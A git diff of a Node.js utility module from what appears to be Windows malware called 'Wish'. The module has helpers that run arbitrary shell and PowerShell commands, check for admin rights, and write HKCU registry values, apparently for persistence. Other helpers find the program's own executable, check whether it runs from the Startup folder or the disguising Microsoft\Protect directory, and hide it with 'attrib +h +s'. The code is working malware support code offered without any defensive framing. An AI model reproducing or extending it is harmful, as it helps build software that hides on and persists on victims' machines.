@@ -1,124 +1,177 @@
 const child_process = require('child_process');
 const util = require("util");
-const fs = require('fs');
 const path = require('path');
 
 const Winreg = require('winreg');
 
 const exec = util.promisify(child_process.exec);
 
-const delay = async (ms) => {
+
+const Delay = async (ms) => {
     return await new Promise(resolve => setTimeout(resolve, ms));
 };
 
-const execCommand = async (command) => {
+const ExecCommand = async (command) => {
     try {
-        const { stdout } = await exec(command);
-        return stdout.trim();
+        const output = await exec(command);
+        return output.stdout.trim();
     } catch (error) {
         console.error(error);
         return '';
     }
 };
 
-const execPowerShell = async (command) => {
+const ExecPowerShell = async (command) => {
     try {
-        const { stdout } = await exec(`powershell -Command "${command}"`);
-        return stdout.trim();
+        const output = await exec(`powershell -Command "${command}"`);
+        return output.stdout.trim();
     } catch (error) {
         console.error(error);
         return '';
     }
 };
 
-const setRegistryValue = ({ keyPath, name, type, value }) => {
+const IsElevated = async () => {
+    try {
+        await exec('net session');
+        return true;
+    } catch {
+        return false;
+    }
+};
+
+const RandString = (length) => {
+    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
+};
+
+const GetProcesses = async (name) => {
+    try {
+        const output = await exec('tasklist');
+
+        return output.stdout.split('\n')
+            .filter(line => line.toLowerCase().includes(name.toLowerCase()))
+            .map(line => {
+                const [name, pid, session, number, memory] = line.split(/\s+/);
+                return {
+                    name: name,
+                    pid: parseInt(pid),
+                    session: session,
+                    number: parseInt(number),
+                    memory: parseInt(memory.replace(',', ''))
+                };
+            });
+    } catch (error) {
+        return [];
+    }
+};
+
+const GetProcessPath = async (pid) => {
+    try {
+        const output = await exec(`wmic process where processid=${pid} get ExecutablePath`);
+
+        return output.stdout.trim();
+    } catch (error) {
+        return '';
+    }
+};
+
+const CurrentAppPath = async () => {
+    try {
+        const exeName = path.basename(process.execPath, '.exe');
+        const [appProcess] = await GetProcesses(exeName);
+
+        if (appProcess) {
+            const exePath = await GetProcessPath(appProcess.pid);
+            const cleanPath = exePath.match(/ExecutablePath\s+([^\n\r]+)/);
+
+            if (cleanPath && cleanPath[1]) {
+                return cleanPath[1];
+            }
+        }
+
+        return 'Not Found';
+    } catch (error) {
+        return 'Not Found';
+    }
+};
+
+const SetRegistryValue = ({ keyPath, name, type, value }) => {
     const regKey = new Winreg({
         hive: Winreg.HKCU,
         key: keyPath,
     });
 
     return new Promise((resolve, reject) => {
-        regKey.set(name, Winreg[type], value, (error) => {
-            if (!error) {
+        try {
+            regKey.set(`"${name}"`, Winreg[type], value, (error) => {
+                if (error) {
+                    return reject(error);
+                }
+
                 resolve();
-            } else {
-                reject(error);
-            }
-        });
+            });
+        } catch (error) {
+            reject(error);
+        }
     });
 };
 
-const isElevated = async () => {
-    return new Promise((resolve, reject) => {
-        child_process.exec('net session', (error) => {
-            resolve(!error);
-        });
-    });
-};
-
-const isRunningStartupDir = () => {
+const IsStartupDirRunning = async () => {
     try {
-        const exePath = process.execPath;
+        const exePath = await CurrentAppPath();
+        if (exePath === 'Not Found') {
+            return false;
+        };
+
         const dirPath = path.dirname(exePath);
 
-        const startupPath = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
         const protectPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
+        const startupPath = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
 
-        if (dirPath === startupPath || dirPath === protectPath) {
-            return true;
-        }
+        return dirPath.includes(protectPath) || dirPath.includes(startupPath);
     } catch (error) {
         return false;
     }
-
-    return false;
 };
 
-const randString = (length) => {
-    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
+
+const isWishRunning = async () => {
+    const exeName = path.basename(process.execPath, '.exe');
+
+    try {
+        const runningProcesses = await GetProcesses(exeName);
+        return runningProcesses.length > 5;
+    } catch (error) {
+        return false;
+    }
 };
 
-const lockFilePath = path.join(__dirname, `.wish.lock`);
-
-const isWishRunning = () => {
-    return fs.existsSync(lockFilePath);
+const HideSelf = async () => {
+    try {
+        const exePath = await CurrentAppPath();
+        if (exePath === 'Not Found') {
+            return
+        };
+        
+        await exec(`attrib +h +s "${exePath}"`);
+    } catch (error) {
+        console.error(error);
+    }
 };
 
-const createUpLock = () => {
-    fs.writeFileSync(lockFilePath, process.pid.toString());
-    child_process.exec(`attrib +h +s "${lockFilePath}"`);
-};
-
-const cleanUpLock = () => {
-    if (fs.existsSync(lockFilePath)) {
-        fs.unlinkSync(lockFilePath);
-    };
-};
-
-const hideSelf = async () => {
-    const exe = process.execPath;
-    return new Promise((resolve, reject) => {
-        child_process.exec(`attrib +h +s "${exe}"`, (error) => {
-            if (!error) {
-                resolve();
-            } else {
-                reject(error);
-            }
-        });
-    });
-};
 
 module.exports = {
-    delay,
-    randString,
+    Delay,
     isWishRunning,
-    setRegistryValue,
-    cleanUpLock,
-    createUpLock,
-    isRunningStartupDir,
-    isElevated,
-    hideSelf,
-    execCommand,
-    execPowerShell
+    GetProcesses,
+    GetProcessPath,
+    CurrentAppPath,
+    RandString,
+    SetRegistryValue,
+    IsStartupDirRunning,
+    IsElevated,
+    HideSelf,
+    ExecCommand,
+    ExecPowerShell
 }
